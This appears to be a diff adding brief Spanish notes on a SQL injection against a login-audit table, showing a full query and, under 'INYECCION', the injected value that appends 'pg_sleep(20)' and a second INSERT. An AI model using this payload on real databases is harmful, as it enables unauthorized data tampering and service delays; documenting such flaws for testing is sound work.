@@ -1,0 +1,5 @@
+uery: INSERT INTO logaccess(usuario, exitoso, fecha_acceso,ipremote) VALUES( 'asd@asd.com', false, now(),'200.11.230.241'); AND SELECT pg_sleep(20); INSERT INTO logaccess(usuario, exitoso, fecha_acceso,ipremote) VALUES('asd2@asd.com', false,now(),'200.11.230.241');
+
+INYECCION
+
+asd@asd.com', false, now(),'200.11.230.241'); SELECT pg_sleep(20); INSERT INTO logaccess(usuario, exitoso, fecha_acceso,ipremote) VALUES('asd2@asd.com
